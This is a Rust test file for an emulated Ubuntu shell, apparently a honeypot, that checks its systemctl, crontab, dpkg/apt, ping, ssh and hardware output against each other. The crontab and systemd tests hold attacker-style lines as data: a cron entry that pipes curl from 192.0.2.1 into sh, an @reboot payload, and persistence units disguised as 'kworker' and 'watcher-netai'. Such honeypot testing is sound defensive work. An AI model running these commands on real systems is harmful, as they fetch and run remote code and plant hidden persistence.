//! `systemctl`, `crontab`, `who`/`w`, `dpkg`/`apt`, `ping`/`ssh` and `lspci`/`lshw` through
//! `handle_input`. The recorded layouts (2026-10-07 Ubuntu 22.04 reference) are pinned byte for
//! byte; the rest is pinned as relations to the commands that read the same model: a running
//! unit's main PID is a `ps` row, an enabled unit is a link `ls` lists, the packages `dpkg -l`
//! counts are the ones `apt list` prints, the MAC `lshw` reports is the one `ip link` shows.

use chrono::{DateTime, TimeZone, Utc};

use super::{CommandResult, EmitContext, FakeShell, OutputFd};
use crate::fakefs::FakeFs;

fn ctx_for(label: &str) -> EmitContext {
    EmitContext {
        source_ip: "203.0.113.7".parse().unwrap(),
        wan_ip: None,
        authenticated: true,
        protocol_label: label.to_string(),
        session_id: None,
    }
}

/// Friday 2026-10-02 12:34:56 UTC.
fn friday() -> DateTime<Utc> {
    Utc.with_ymd_and_hms(2026, 10, 2, 12, 34, 56).unwrap()
}

fn shell() -> FakeShell {
    FakeShell::new(FakeFs::new(), ctx_for("ssh")).with_clock(friday)
}

fn exec() -> FakeShell {
    FakeShell::exec(FakeFs::new(), ctx_for("ssh")).with_clock(friday)
}

fn telnet() -> FakeShell {
    FakeShell::new(FakeFs::new(), ctx_for("telnet")).with_clock(friday)
}

fn stream(out: &CommandResult, fd: OutputFd) -> String {
    let bytes: Vec<u8> = out
        .output
        .iter()
        .filter(|segment| segment.fd == fd)
        .flat_map(|segment| segment.bytes.iter().copied())
        .collect();
    String::from_utf8(bytes).unwrap()
}

/// `(stdout, stderr, status)` of one line.
fn answer(sh: &mut FakeShell, line: &str) -> (String, String, u8) {
    let out = sh.handle_input(line).0;
    (
        stream(&out, OutputFd::Stdout),
        stream(&out, OutputFd::Stderr),
        out.status,
    )
}

fn out(sh: &mut FakeShell, line: &str) -> String {
    answer(sh, line).0
}

// ------------------------------------------------------------------------------------ systemctl

#[test]
fn running_services_are_the_processes_ps_lists_in_the_recorded_layout() {
    let mut sh = exec();
    let listing = out(
        &mut sh,
        "systemctl list-units --type=service --state=running",
    );
    let lines: Vec<&str> = listing.lines().collect();
    let header = lines.first().copied().unwrap_or_default();
    assert!(
        header.starts_with("  UNIT ") && header.ends_with(" LOAD   ACTIVE SUB     DESCRIPTION"),
        "{listing}"
    );
    let rows: Vec<&str> = lines
        .iter()
        .skip(1)
        .take_while(|line| !line.is_empty())
        .copied()
        .collect();
    // The legend and the filtered footer, as recorded.
    assert!(listing.ends_with(&format!(
        "\nLOAD   = Reflects whether the unit definition was properly loaded.\n\
         ACTIVE = The high-level unit activation state, i.e. generalization of SUB.\n\
         SUB    = The low-level unit activation state, values depend on unit type.\n\
         {} loaded units listed.\n",
        rows.len()
    )));
    // Every column starts where the header's does.
    let unit_width = header.find("LOAD").unwrap();
    for row in &rows {
        assert_eq!(
            &row[unit_width..unit_width + 22],
            "loaded active running ",
            "{row}"
        );
    }
    // Sorted as systemctl sorts, ignoring case: ModemManager sits between getty and multipathd.
    let names: Vec<&str> = rows
        .iter()
        .map(|r| r.split_whitespace().next().unwrap())
        .collect();
    let mut sorted = names.clone();
    sorted.sort_by_key(|n| n.to_ascii_lowercase());
    assert_eq!(names, sorted);
    for unit in [
        "cron.service",
        "ssh.service",
        "systemd-journald.service",
        "user@0.service",
    ] {
        assert!(names.contains(&unit), "{unit}: {names:?}");
    }
    // Each one's main PID is a process ps lists with the same command.
    for unit in &names {
        let status = out(&mut sh, &format!("systemctl status {unit}"));
        let main = status
            .lines()
            .find_map(|l| l.trim_start().strip_prefix("Main PID: "))
            .unwrap_or_else(|| panic!("{unit}: {status}"));
        let (pid, comm) = main.split_once(' ').unwrap();
        let comm = comm.trim_matches(['(', ')']);
        assert_eq!(
            out(&mut sh, &format!("ps -o comm= -p {pid}")).trim(),
            comm,
            "{unit}"
        );
    }
    // The survey's own form.
    assert_eq!(
        out(
            &mut sh,
            "systemctl list-units --type=service --state=running 2>/dev/null | head -10"
        )
        .lines()
        .count(),
        10
    );
    // Over telnet the box runs telnetd, not sshd, so there is no ssh unit.
    let mut tel = telnet();
    assert!(!out(&mut tel, "systemctl list-units --type=service").contains("ssh.service"));
    assert_eq!(answer(&mut tel, "systemctl status ssh").2, 4);
}

#[test]
fn status_agrees_with_ps_on_the_pid_the_command_line_and_the_start_time() {
    let mut sh = exec();
    let status = out(&mut sh, "systemctl status cron");
    let pid = out(&mut sh, "pgrep -x cron").trim().to_string();
    let lstart = out(&mut sh, &format!("ps -o lstart= -p {pid}"));
    let clock = lstart.split_whitespace().nth(3).unwrap().to_string();
    let lines: Vec<&str> = status.lines().collect();
    assert_eq!(
        lines[0],
        "\u{25cf} cron.service - Regular background program processing daemon"
    );
    assert_eq!(
        lines[1],
        "     Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabled)"
    );
    assert!(
        lines[2].starts_with("     Active: active (running) since ")
            && lines[2].contains(&format!(" {clock} UTC; ")),
        "{status} / {lstart}"
    );
    assert_eq!(lines[3], "       Docs: man:cron(8)");
    assert_eq!(lines[4], format!("   Main PID: {pid} (cron)"));
    assert!(status.contains(&format!(
        "     CGroup: /system.slice/cron.service\n             \u{2514}\u{2500}{pid} /usr/sbin/cron -f -P\n"
    )));
    // An argument with a space or a backslash is quoted, as systemd 249 prints it.
    assert!(
        out(&mut sh, "systemctl status getty@tty1.service")
            .contains(r#"/sbin/agetty -o "-p -- \\u" --noclear tty1 linux"#)
    );
    // A static unit has no vendor preset.
    assert!(
        out(&mut sh, "systemctl status dbus")
            .contains("     Loaded: loaded (/lib/systemd/system/dbus.service; static)\n")
    );
}

#[test]
fn the_recorded_errors_and_statuses_of_unknown_units_and_verbs() {
    let mut sh = exec();
    for (line, expected) in [
        (
            "systemctl start nonexist.service",
            (
                "",
                "Failed to start nonexist.service: Unit nonexist.service not found.\n",
                5,
            ),
        ),
        (
            "systemctl restart nonexist",
            (
                "",
                "Failed to restart nonexist.service: Unit nonexist.service not found.\n",
                5,
            ),
        ),
        (
            "systemctl stop nonexist",
            (
                "",
                "Failed to stop nonexist.service: Unit nonexist.service not loaded.\n",
                5,
            ),
        ),
        (
            "systemctl status nonexist",
            ("", "Unit nonexist.service could not be found.\n", 4),
        ),
        (
            "systemctl is-enabled nonexist",
            (
                "",
                "Failed to get unit file state for nonexist.service: No such file or directory\n",
                1,
            ),
        ),
        (
            "systemctl enable nonexist",
            (
                "",
                "Failed to enable unit: Unit file nonexist.service does not exist.\n",
                1,
            ),
        ),
        ("systemctl bogus", ("", "Unknown command verb bogus.\n", 1)),
        ("systemctl daemon-reload", ("", "", 0)),
        ("systemctl --user daemon-reload", ("", "", 0)),
        ("systemctl is-active ssh cron", ("active\nactive\n", "", 0)),
        (
            "systemctl is-active ssh nonexist",
            ("active\ninactive\n", "", 0),
        ),
        ("systemctl is-active nonexist", ("inactive\n", "", 3)),
        (
            "systemctl is-enabled ssh cron dbus",
            ("enabled\nenabled\nstatic\n", "", 0),
        ),
        ("systemctl restart ssh", ("", "", 0)),
    ] {
        let (stdout, stderr, status) = answer(&mut sh, line);
        assert_eq!(
            (stdout.as_str(), stderr.as_str(), status),
            expected,
            "{line}"
        );
    }
    assert_eq!(
        out(&mut sh, "systemctl --version").lines().next(),
        Some("systemd 249 (249.11-0ubuntu3.22)")
    );
    // The package database carries the same systemd.
    assert!(out(&mut sh, "dpkg -l systemd").contains(" 249.11-0ubuntu3.22 "));
    // An empty user manager, as recorded.
    assert_eq!(
        out(&mut sh, "systemctl --user list-units --type=service"),
        "  UNIT LOAD ACTIVE SUB DESCRIPTION\n\
         0 loaded units listed. Pass --all to see loaded but inactive units, too.\n\
         To show all installed unit files use 'systemctl list-unit-files'.\n"
    );
}

#[test]
fn a_dropped_unit_is_enabled_by_a_link_ls_sees_and_is_never_run() {
    let mut sh = exec();
    let unit = "printf '[Unit]\\nDescription=y\\n[Service]\\nExecStart=/bin/sleep 1000\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/kworker.service";
    assert_eq!(answer(&mut sh, unit).2, 0);
    assert_eq!(
        answer(&mut sh, "systemctl enable kworker.service"),
        (
            String::new(),
            "Created symlink /etc/systemd/system/multi-user.target.wants/kworker.service \u{2192} /etc/systemd/system/kworker.service.\n".to_string(),
            0
        )
    );
    assert_eq!(
        out(
            &mut sh,
            "readlink /etc/systemd/system/multi-user.target.wants/kworker.service"
        ),
        "/etc/systemd/system/kworker.service\n"
    );
    assert_eq!(out(&mut sh, "systemctl is-enabled kworker"), "enabled\n");
    // Enabling again links nothing new and says nothing.
    assert_eq!(
        answer(&mut sh, "systemctl enable --now kworker.service"),
        (String::new(), String::new(), 0)
    );
    // Never run: recorded as the status of an enabled unit that has not started.
    assert_eq!(
        answer(&mut sh, "systemctl status kworker"),
        (
            "\u{25cb} kworker.service - y\n     Loaded: loaded (/etc/systemd/system/kworker.service; enabled; vendor preset: enabled)\n     Active: inactive (dead)\n".to_string(),
            String::new(),
            3
        )
    );
    assert!(!out(&mut sh, "ps aux").contains("sleep 1000"));
    assert!(out(&mut sh, "systemctl list-unit-files --type=service").contains("kworker.service"));
    assert_eq!(
        answer(&mut sh, "systemctl disable kworker.service"),
        (
            String::new(),
            "Removed /etc/systemd/system/multi-user.target.wants/kworker.service.\n".to_string(),
            0
        )
    );
    assert_eq!(
        answer(&mut sh, "systemctl is-enabled kworker"),
        ("disabled\n".to_string(), String::new(), 1)
    );
    // The user manager's directory, as the recorded persistence step used it.
    let user_unit = "mkdir -p ~/.config/systemd/user; printf '[Unit]\\nDescription=x\\n[Service]\\nExecStart=/bin/sleep 1000\\n[Install]\\nWantedBy=default.target\\n' > ~/.config/systemd/user/watcher-netai.service; systemctl --user enable watcher-netai.service";
    assert_eq!(
        answer(&mut sh, user_unit).1,
        "Created symlink /root/.config/systemd/user/default.target.wants/watcher-netai.service \u{2192} /root/.config/systemd/user/watcher-netai.service.\n"
    );
    // A stock unit's enablement is its link too.
    assert!(
        answer(&mut sh, "systemctl disable ssh")
            .1
            .contains("Removed /etc/systemd/system/multi-user.target.wants/ssh.service.")
    );
    assert_eq!(out(&mut sh, "systemctl is-enabled ssh"), "disabled\n");
    assert_eq!(
        answer(&mut sh, "systemctl enable ssh").1,
        "Created symlink /etc/systemd/system/multi-user.target.wants/ssh.service \u{2192} /lib/systemd/system/ssh.service.\n"
    );
}

// -------------------------------------------------------------------------------------- crontab

#[test]
fn crontab_keeps_its_table_in_the_spool_with_the_recorded_messages() {
    let mut sh = exec();
    assert_eq!(
        answer(&mut sh, "crontab -l"),
        (String::new(), "no crontab for root\n".to_string(), 1)
    );
    assert_eq!(
        answer(
            &mut sh,
            "echo '* * * * * /bin/true' | crontab -; crontab -l"
        ),
        ("* * * * * /bin/true\n".to_string(), String::new(), 0)
    );
    let stored = out(&mut sh, "cat /var/spool/cron/crontabs/root");
    let lines: Vec<&str> = stored.lines().collect();
    assert_eq!(
        lines[0],
        "# DO NOT EDIT THIS FILE - edit the master and reinstall."
    );
    assert_eq!(lines[1], "# (- installed on Fri Oct  2 12:34:56 2026)");
    assert_eq!(
        lines[2],
        "# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)"
    );
    assert_eq!(lines[3], "* * * * * /bin/true");
    let listed = out(&mut sh, "ls -l /var/spool/cron/crontabs");
    assert!(listed.contains("-rw------- 1 root crontab "), "{listed}");
    assert!(out(&mut sh, "ls -ld /var/spool/cron/crontabs").starts_with("drwx-wx--T "));
    assert!(out(&mut sh, "ls -l /usr/bin/crontab").starts_with("-rwxr-sr-x 1 root crontab 39568 "));
    assert_eq!(
        answer(&mut sh, "crontab -r; crontab -l"),
        (String::new(), "no crontab for root\n".to_string(), 1)
    );
    assert_eq!(answer(&mut sh, "crontab -r").1, "no crontab for root\n");
    assert_eq!(
        answer(&mut sh, "echo 'x y' | crontab -"),
        (
            String::new(),
            "\"-\":0: bad minute\nerrors in crontab file, can't install.\n".to_string(),
            1
        )
    );
    assert_eq!(
        answer(&mut sh, "printf '* * * * *' | crontab -"),
        (
            String::new(),
            "new crontab file is missing newline before EOF, can't install.\n".to_string(),
            1
        )
    );
    let (_, usage, status) = answer(&mut sh, "crontab -z");
    assert_eq!(status, 1);
    assert!(usage.starts_with(
        "crontab: invalid option -- 'z'\ncrontab: usage error: unrecognized option\nusage:\tcrontab [-u user] file\n"
    ));
    // A table the dropper wrote is what cron would run; nothing ran it.
    assert_eq!(
        answer(
            &mut sh,
            "printf '@reboot /tmp/x\\n*/5 * * * * curl -s http://192.0.2.1/x | sh\\nSHELL=/bin/sh\\n# c\\n' | crontab -; crontab -l"
        )
        .0,
        "@reboot /tmp/x\n*/5 * * * * curl -s http://192.0.2.1/x | sh\nSHELL=/bin/sh\n# c\n"
    );
}

// ------------------------------------------------------------------------------------- who and w

#[test]
fn who_and_w_show_the_login_the_session_is_and_uptime_counts() {
    // An exec request logs nobody in (recorded): who prints nothing, w only its headings.
    let mut sh = exec();
    assert_eq!(answer(&mut sh, "who"), (String::new(), String::new(), 0));
    let w = out(&mut sh, "w");
    let mut lines = w.lines();
    assert_eq!(
        lines.next().map(str::to_string),
        Some(out(&mut sh, "uptime").trim_end().to_string())
    );
    assert_eq!(
        lines.next(),
        Some("USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT")
    );
    assert_eq!(lines.next(), None);
    assert_eq!(out(&mut sh, "w -h"), "");
    // An interactive login is one user, from the session's own peer.
    let mut sh = shell();
    assert_eq!(
        out(&mut sh, "who"),
        "root     pts/0        2026-10-02 12:34 (203.0.113.7)\n"
    );
    assert!(out(&mut sh, "uptime").contains(",  1 user,  "));
    assert_eq!(out(&mut sh, "who | wc -l"), "1\n");
    assert!(
        out(&mut sh, "w -h").starts_with("root     pts/0    203.0.113.7      12:34 "),
        "{}",
        out(&mut sh, "w -h")
    );
}

// --------------------------------------------------------------------------------- dpkg and apt

#[test]
fn dpkg_and_apt_list_one_package_database() {
    let mut sh = exec();
    let count = crate::packages::installed().count();
    assert_eq!(
        out(&mut sh, "dpkg -l | wc -l"),
        format!("{}\n", count + 5),
        "five header lines"
    );
    assert_eq!(
        out(&mut sh, "apt list --installed 2>/dev/null | wc -l"),
        format!("{}\n", count + 1),
        "Listing..."
    );
    assert_eq!(
        answer(&mut sh, "apt list --installed 2>&1 >/dev/null").0,
        "\nWARNING: apt does not have a stable CLI interface. Use with caution in scripts.\n\n"
    );
    // The recorded layout, at the version the SSH banner announces.
    assert_eq!(
        out(&mut sh, "dpkg -l openssh-server"),
        "Desired=Unknown/Install/Remove/Purge/Hold\n\
         | Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend\n\
         |/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)\n\
         ||/ Name           Version             Architecture Description\n\
         +++-==============-===================-============-=================================================================\n\
         ii  openssh-server 1:8.9p1-3ubuntu0.10 amd64        secure shell (SSH) server, for secure access from remote machines\n"
    );
    let ssh_version = answer(&mut sh, "ssh -V").1;
    assert_eq!(
        ssh_version,
        "OpenSSH_8.9p1 Ubuntu-3ubuntu0.10, OpenSSL 3.0.2 15 Mar 2022\n"
    );
    assert_eq!(
        out(&mut sh, "dpkg -s openssh-server | head -12"),
        "Package: openssh-server\nStatus: install ok installed\nPriority: optional\nSection: net\n\
         Installed-Size: 1505\nMaintainer: Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>\n\
         Architecture: amd64\nMulti-Arch: foreign\nSource: openssh\nVersion: 1:8.9p1-3ubuntu0.10\n\
         Replaces: openssh-client (<< 1:7.9p1-8), ssh, ssh-krb5\nProvides: ssh-server\n"
    );
    assert_eq!(
        answer(&mut sh, "dpkg -l nosuch"),
        (
            String::new(),
            "dpkg-query: no packages found matching nosuch\n".to_string(),
            1
        )
    );
    assert_eq!(
        answer(&mut sh, "dpkg -s nosuch"),
        (
            String::new(),
            "dpkg-query: package 'nosuch' is not installed and no information is available\n\
             Use dpkg --info (= dpkg-deb --info) to examine archive files.\n"
                .to_string(),
            1
        )
    );
    // A Multi-Arch: same package shows its architecture in dpkg's name column only.
    assert!(out(&mut sh, "dpkg -l libc6").contains("ii  libc6:amd64 "));
    assert!(out(&mut sh, "apt list --installed 2>/dev/null").contains(
        "\nlibc6/now 2.35-0ubuntu3.14 amd64 [installed,upgradable to: 2.35-0ubuntu3.15]\n"
    ));
    // Installing what is there is the recorded no-op; anything else cannot be located.
    let held = out(&mut sh, "apt list --upgradable 2>/dev/null")
        .lines()
        .count()
        - 1;
    assert_eq!(
        answer(&mut sh, "apt-get install -y bash"),
        (
            format!(
                "Reading package lists...\nBuilding dependency tree...\nReading state information...\n\
                 bash is already the newest version (5.1-6ubuntu1.1).\n\
                 0 upgraded, 0 newly installed, 0 to remove and {held} not upgraded.\n"
            ),
            String::new(),
            0
        )
    );
    assert_eq!(
        answer(&mut sh, "apt-get install -y nosuchpkg"),
        (
            "Reading package lists...\nBuilding dependency tree...\nReading state information...\n"
                .to_string(),
            "E: Unable to locate package nosuchpkg\n".to_string(),
            100
        )
    );
    assert_eq!(
        out(&mut sh, "apt update 2>/dev/null").lines().last(),
        Some(
            format!("{held} packages can be upgraded. Run 'apt list --upgradable' to see them.")
                .as_str()
        )
    );
    assert_eq!(
        out(&mut sh, "apt-get update"),
        "Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease\n\
         Hit:2 http://security.ubuntu.com/ubuntu jammy-security InRelease\n\
         Hit:3 http://archive.ubuntu.com/ubuntu jammy-updates InRelease\n\
         Hit:4 http://archive.ubuntu.com/ubuntu jammy-backports InRelease\n\
         Reading package lists...\n"
    );
    for name in [
        "apt",
        "apt-get",
        "dpkg",
        "ssh",
        "systemctl",
        "crontab",
        "lspci",
        "lshw",
        "ping",
    ] {
        assert_eq!(
            out(&mut sh, &format!("which {name}")),
            format!("/usr/bin/{name}\n")
        );
    }
}

// ------------------------------------------------------------------------------ ping, ssh, hw

#[test]
fn ping_invents_replies_for_what_resolves_and_fails_what_does_not() {
    let mut sh = exec();
    assert_eq!(
        out(
            &mut sh,
            "ping -c 1 8.8.8.8 2>/dev/null | grep '1 packets transmitted'"
        ),
        "1 packets transmitted, 1 received, 0% packet loss, time 0ms\n"
    );
    let three = out(&mut sh, "ping -c 3 8.8.8.8");
    let lines: Vec<&str> = three.lines().collect();
    assert_eq!(lines[0], "PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.");
    let replies: Vec<f64> = lines
        .iter()
        .filter(|l| l.starts_with("64 bytes from 8.8.8.8: icmp_seq="))
        .map(|l| {
            l.rsplit_once("time=")
                .unwrap()
                .1
                .trim_end_matches(" ms")
                .parse()
                .unwrap()
        })
        .collect();
    assert_eq!(replies.len(), 3);
    let rtt = lines.last().unwrap();
    let figures: Vec<f64> = rtt
        .strip_prefix("rtt min/avg/max/mdev = ")
        .unwrap()
        .trim_end_matches(" ms")
        .split('/')
        .map(|f| f.parse().unwrap())
        .collect();
    let min = replies.iter().copied().fold(f64::MAX, f64::min);
    let max = replies.iter().copied().fold(0.0, f64::max);
    assert!(
        (figures[0] - min).abs() < 0.1 && (figures[2] - max).abs() < 0.1,
        "{three}"
    );
    assert!(figures[0] <= figures[1] && figures[1] <= figures[2]);
    assert!(three.contains("3 packets transmitted, 3 received, 0% packet loss, time 2002ms\n"));
    // The same host answers the same way twice; loopback is a local hop.
    assert_eq!(
        out(&mut sh, "ping -c 2 8.8.8.8"),
        out(&mut sh, "ping -c 2 8.8.8.8")
    );
    assert!(
        out(&mut sh, "ping -c 1 localhost")
            .contains("64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.0")
    );
    // A name the box cannot resolve fails as getent says it does.
    assert_eq!(answer(&mut sh, "getent hosts nosuch.example").2, 2);
    assert_eq!(
        answer(&mut sh, "ping -c 1 nosuch.example"),
        (
            String::new(),
            "ping: nosuch.example: Name or service not known\n".to_string(),
            2
        )
    );
    assert_eq!(
        answer(&mut sh, "ping"),
        (
            String::new(),
            "ping: usage error: Destination address required\n".to_string(),
            1
        )
    );
    // The time it would have taken is what `time` reports.
    let timed = answer(&mut sh, "time ping -c 3 192.0.2.1 >/dev/null").1;
    assert!(timed.contains("real\t0m2."), "{timed}");
}

#[test]
fn ssh_reports_its_version_usage_and_a_connect_that_never_happens() {
    let mut sh = exec();
    let (stdout, usage, status) = answer(&mut sh, "ssh");
    assert_eq!((stdout.as_str(), status), ("", 255));
    assert!(usage.starts_with("usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]\n"));
    assert!(usage.ends_with(
        "           [-w local_tun[:remote_tun]] destination [command [argument ...]]\n"
    ));
    assert_eq!(
        answer(&mut sh, "ssh 192.0.2.1 -o ConnectTimeout=2"),
        (
            String::new(),
            "Pseudo-terminal will not be allocated because stdin is not a terminal.\n\
             ssh: connect to host 192.0.2.1 port 22: Connection timed out\n"
                .to_string(),
            255
        )
    );
    assert_eq!(
        answer(&mut sh, "ssh nosuchhost.invalid"),
        (
            String::new(),
            "Pseudo-terminal will not be allocated because stdin is not a terminal.\n\
             ssh: Could not resolve hostname nosuchhost.invalid: Name or service not known\n"
                .to_string(),
            255
        )
    );
    // With a command there is no pseudo-terminal to refuse.
    assert_eq!(
        answer(&mut sh, "ssh -p 2222 root@192.0.2.1 id").1,
        "ssh: connect to host 192.0.2.1 port 2222: Connection timed out\n"
    );
    let timed = answer(&mut sh, "time ssh -o ConnectTimeout=2 192.0.2.1 true").1;
    assert!(timed.contains("real\t0m2."), "{timed}");
}

#[test]
fn the_hardware_tools_describe_the_guest_the_network_model_is() {
    let mut sh = exec();
    assert_eq!(
        out(&mut sh, "lspci 2>/dev/null | grep -iE 'vga|3d|display'"),
        "00:02.0 VGA compatible controller: Cirrus Logic GD 5446\n"
    );
    assert_eq!(
        out(
            &mut sh,
            "lshw -C display 2>/dev/null | grep -E 'product|vendor' | head -4"
        ),
        "       product: GD 5446\n       vendor: Cirrus Logic\n"
    );
    let network = out(&mut sh, "lshw -C network");
    let link = out(&mut sh, "ip link show eth0");
    let mac = link
        .split_whitespace()
        .skip_while(|w| *w != "link/ether")
        .nth(1)
        .unwrap()
        .to_string();
    assert!(
        network.contains(&format!("       serial: {mac}\n")),
        "{network}"
    );
    let address = out(&mut sh, "hostname -I").trim().to_string();
    assert!(network.contains(&format!(" ip={address} ")), "{network}");
    assert!(network.contains("       logical name: eth0\n"));
}

// ------------------------------------------------------------------------------ path dispatch

#[test]
fn a_file_the_session_wrote_runs_as_itself_whatever_its_name() {
    let mut sh = exec();
    // An empty program named like a modeled command prints nothing, as it would.
    assert_eq!(
        answer(
            &mut sh,
            "echo > /tmp/w; chmod +x /tmp/w; /tmp/w; echo rc=$?"
        ),
        ("rc=0\n".to_string(), String::new(), 0)
    );
    // The modeled command at its own path still answers.
    assert!(out(&mut sh, "/usr/bin/w").contains("USER     TTY"));
    // A copy of a modeled binary runs as that binary.
    assert_eq!(
        out(&mut sh, "cp /bin/dash /tmp/x; /tmp/x -c 'echo hi'"),
        "hi\n"
    );
}
